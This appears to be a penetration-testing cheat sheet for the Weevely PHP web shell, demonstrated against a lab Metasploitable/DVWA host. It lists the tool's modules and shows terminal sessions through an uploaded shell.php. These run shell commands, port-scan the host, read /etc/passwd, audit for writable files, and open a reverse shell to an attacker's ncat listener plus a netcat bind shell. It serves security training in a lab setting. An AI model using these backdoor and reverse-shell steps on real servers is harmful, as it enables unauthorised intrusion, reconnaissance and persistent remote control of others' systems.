# Weevely

## Help Menu

```
www-data@172.28.128.8:/var/www/phpMyAdmin $ help
The remote script execution triggers an error 500, check script and payload integrity

 :sql_console                  Execute SQL query or run console.
 :sql_dump                     Multi dbms mysqldump replacement.
 :system_info                  Collect system information.
 :system_procs                 List running processes.
 :system_extensions            Collect PHP and webserver extension list.
 :audit_suidsgid               Find files with SUID or SGID flags.
 :audit_etcpasswd              Read /etc/passwd with different techniques.
 :audit_filesystem             Audit the file system for weak permissions.
 :audit_phpconf                Audit PHP configuration.
 :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.
 :backdoor_reversetcp          Execute a reverse TCP shell.
 :backdoor_tcp                 Spawn a shell on a TCP port.
 :file_grep                    Print lines matching a pattern in multiple files.
 :file_enum                    Check existence and permissions of a list of paths.
 :file_edit                    Edit remote file on a local editor.
 :file_bzip2                   Compress or expand bzip2 files.
 :file_download                Download file from remote filesystem.
 :file_check                   Get attributes and permissions of a file.
 :file_zip                     Compress or expand zip files.
 :file_tar                     Compress or expand tar archives.
 :file_cp                      Copy single file.
 :file_upload2web              Upload file automatically to a web folder and get corresponding URL.
 :file_upload                  Upload file to remote filesystem.
 :file_ls                      List directory content.
 :file_find                    Find files with given names and attributes.
 :file_read                    Read remote file from the remote filesystem.
 :file_cd                      Change current working directory.
 :file_mount                   Mount remote filesystem using HTTPfs.
 :file_touch                   Change file timestamp.
 :file_clearlog                Remove string from a file.
 :file_rm                      Remove remote file.
 :file_gzip                    Compress or expand gzip files.
 :file_webdownload             Download an URL.
 :shell_sh                     Execute shell commands.
 :shell_php                    Execute PHP commands.
 :shell_su                     Execute commands with su.
 :bruteforce_sql               Bruteforce SQL database.
 :net_phpproxy                 Install PHP proxy on the target.
 :net_scan                     TCP Port scan.
 :net_ifconfig                 Get network interfaces addresses.
 :net_mail                     Send mail.
 :net_curl                     Perform a curl-like HTTP request.
 :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.
 ```

## Basic Commands

### Execute

Using `:shell_sh` to execute commands

```
www-data@172.28.128.8:/var/www/phpMyAdmin $ shell_sh -h
The remote script execution triggers an error 500, check script and payload integrity
usage: shell_sh [-h] [-stderr_redirection STDERR_REDIRECTION] [-vector {system,passthru,shell_exec,exec,popen,proc_open,python_eval,perl_system,pcntl}]
                command [command ...]

Execute shell commands.

positional arguments:
  command               Shell command

optional arguments:
  -h, --help            show this help message and exit
  -stderr_redirection STDERR_REDIRECTION
  -vector {system,passthru,shell_exec,exec,popen,proc_open,python_eval,perl_system,pcntl}
www-data@172.28.128.8:/var/www/phpMyAdmin $ shell_sh ls
The remote script execution triggers an error 500, check script and payload integrity
CREDITS
ChangeLog
Documentation.html
Documentation.txt
INSTALL
LICENSE
..[snip]..
user_password.php
view_create.php
webapp.php
```

### Navigation

Using `:file_cd` to navigate the files

```
www-data@172.28.128.8:/var/www/phpMyAdmin $ file_cd ../dvwa/vulnerabilities
The remote script execution triggers an error 500, check script and payload integrity
```

## Internal Reconnaissance

### Port Scan

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ net_scan -h
The remote script execution triggers an error 500, check script and payload integrity
usage: net_scan [-h] [-timeout TIMEOUT] [-print] addresses ports

TCP Port scan.

positional arguments:
  addresses         IPs or interface e.g. 10.1.1.1,10.1.1.2 or 10.1.1.1-254 or 10.1.1.1/255.255.255.0 or eth0
  ports             Ports e.g. 80,8080 or 80,8080-9090

optional arguments:
  -h, --help        show this help message and exit
  -timeout TIMEOUT  Connection timeout
  -print            Print closed and filtered ports
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ net_scan 172.28.128.8 21-25,53,80-1024
The remote script execution triggers an error 500, check script and payload integrity
Scanning addresses 172.28.128.8-172.28.128.8:21-25
Scanning addresses 172.28.128.8-172.28.128.8:53-83
Scanning addresses 172.28.128.8-172.28.128.8:84-88
Scanning addresses 172.28.128.8-172.28.128.8:89-93
Scanning addresses 172.28.128.8-172.28.128.8:94-98
Scanning addresses 172.28.128.8-172.28.128.8:99-103
Scanning addresses 172.28.128.8-172.28.128.8:104-108
..[snip]..
Scanning addresses 172.28.128.8-172.28.128.8:1004-1008
Scanning addresses 172.28.128.8-172.28.128.8:1009-1013
Scanning addresses 172.28.128.8-172.28.128.8:1014-1018
Scanning addresses 172.28.128.8-172.28.128.8:1019-1023
Scanning addresses 172.28.128.8-172.28.128.8:1024-1024
+------------------+
| 172.28.128.8:21  |
| 172.28.128.8:22  |
| 172.28.128.8:23  |
| 172.28.128.8:25  |
| 172.28.128.8:53  |
| 172.28.128.8:80  |
| 172.28.128.8:111 |
| 172.28.128.8:139 |
| 172.28.128.8:445 |
| 172.28.128.8:512 |
| 172.28.128.8:513 |
| 172.28.128.8:514 |
+------------------+
```

## Basic Enumeration

### System

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ system_info
The remote script execution triggers an error 500, check script and payload integrity
The remote script execution triggers an error 500, check script and payload integrity
+--------------------+--------------------------------------------------------------------------------+
| document_root      | /var/www/                                                                      |
| whoami             | www-data                                                                       |
| hostname           |                                                                                |
| pwd                | /var/www/dvwa/vulnerabilities                                                  |
| open_basedir       |                                                                                |
| safe_mode          | False                                                                          |
| script             | /dvwa/hackable/uploads/shell.php                                               |
| script_folder      | /var/www/dvwa/hackable/uploads                                                 |
| uname              | Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 |
| os                 | Linux                                                                          |
| client_ip          | 172.28.128.14                                                                  |
| max_execution_time | 30                                                                             |
| php_self           | /dvwa/hackable/uploads/shell.php                                               |
| dir_sep            | /                                                                              |
| php_version        | 5.2.4-2ubuntu5.10                                                              |
+--------------------+--------------------------------------------------------------------------------+
```

### Usernames

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ audit_etcpasswd
The remote script execution triggers an error 500, check script and payload integrity
root:x:0:0:root:/root:/bin/bash
..[snip]..
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ audit_filesystem
The remote script execution triggers an error 500, check script and payload integrity
Search executable files in /home/ folder
/home/
/home/service
/home/ftp
/home/user
/home/msfadmin
Search writable files in /home/ folder
Search certain readable files in etc folder
/etc/apparmor.d/abstractions/ssl_keys
/etc/X11/fluxbox/keys
/etc/X11/xkb/compat/mousekeys
/etc/X11/xkb/types/mousekeys
Search certain readable log files
/var/log/dpkg.log
/var/log/wtmp
/var/log/udev
/var/log/boot
/var/log/lastlog
Search writable files in /var/spool/cron/ folder
Search writable files in binary folders
/lib/udev/devices/stderr
/lib/udev/devices/fd
/lib/udev/devices/stdin
/lib/udev/devices/stdout
/lib/udev/devices/fd/0
/lib/udev/devices/fd/1
/lib/udev/devices/fd/2
/lib/udev/devices/fd/3
Search writable files in etc folder
Search writable files in / folder
/tmp
```

### Network

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ net_ifconfig
The remote script execution triggers an error 500, check script and payload integrity
+------+-----------------+
| eth0 | 172.28.128.8/24 |
| lo   | 127.0.0.1/8     |
+------+-----------------+
```

## Spawn Callback Shell

### 1. Reverse Shell

* **Attacker (waiting callback)**

`user@pentestos:~$ sudo ncat -lnvp 443`

* **Compromised Target (Web Server)**

```
weevely> backdoor_reversetcp -h
The remote script execution triggers an error 500, check script and payload integrity
usage: backdoor_reversetcp [-h] [-shell SHELL] [-no-autonnect] [-vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}] lhost port

Execute a reverse TCP shell.

positional arguments:
  lhost                 Local host
  port                  Port to spawn

optional arguments:
  -h, --help            show this help message and exit
  -shell SHELL          Specify shell
  -no-autonnect         Skip autoconnect
  -vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ backdoor_reversetcp -shell /bin/bash -vector netcat_bsd 172.28.128.14 443
The remote script execution triggers an error 500, check script and payload integrity
Error binding socket: '[Errno 98] Address already in use'
```

• **Attacker (callback established)**

```
user@pentestos:~$ sudo ncat -lnvp 443
[sudo] password for user:
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 172.28.128.8.
Ncat: Connection from 172.28.128.8:47902.
bash: no job control in this shell
www-data@metasploitable:/var/www/dvwa/vulnerabilities$ ls
brute
csrf
exec
fi
sqli
sqli_blind
upload
view_help.php
view_source.php
view_source_all.php
xss_r
xss_s
www-data@metasploitable:/var/www/dvwa/vulnerabilities$
```

### 2. Bind Shell

The `:backdoor_tcp` command module function in weevely for spawning a remote shell via netcat.

* **Compromised Target (Web Server)**

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ backdoor_tcp -shell /bin/bash -vector netcat 8080
The remote script execution triggers an error 500, check script and payload integrity
Error connecting to 172.28.128.8:443: remote port not open or unreachable
```

The alternative is you run with any commands.

`www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ nc -lnvp 8080`

* **Attacker**

`user@pentestos:~$ nc 172.28.128.8 8080`

## HTTP Proxy

`http://weevely` (to install the certificate first after installing the `:net_proxy` or `:net_phpproxy`)

### References

* [Web App Hacking Part 6 Injecting a Backdoor into a Website with Weevely](https://www.hackers-arise.com/post/2017/12/03/Web-App-Hacking-Part-6-Injecting-a-Backdoor-into-a-Website-with-weevely)